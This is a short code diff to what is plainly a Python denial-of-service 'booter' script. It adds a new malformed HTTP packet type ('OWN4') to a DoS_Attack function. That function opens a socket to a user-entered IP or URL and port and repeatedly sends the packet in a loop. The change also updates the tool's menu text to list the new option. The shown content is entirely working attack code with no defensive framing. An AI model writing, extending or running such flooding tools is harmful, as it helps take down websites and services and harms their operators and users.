@@ -55,6 +55,8 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
         elif data_type_loader_packet == 'OWN3':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
+        elif data_type_loader_packet == 'OWN4':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
@@ -103,7 +105,7 @@ banner = f"""
 print(banner)
 host = ""
 ip = ""
-print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-3")
+print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-4")
 data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)>").upper()
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
 port_loader = int(input(f"{Fore.YELLOW}PORT>"))
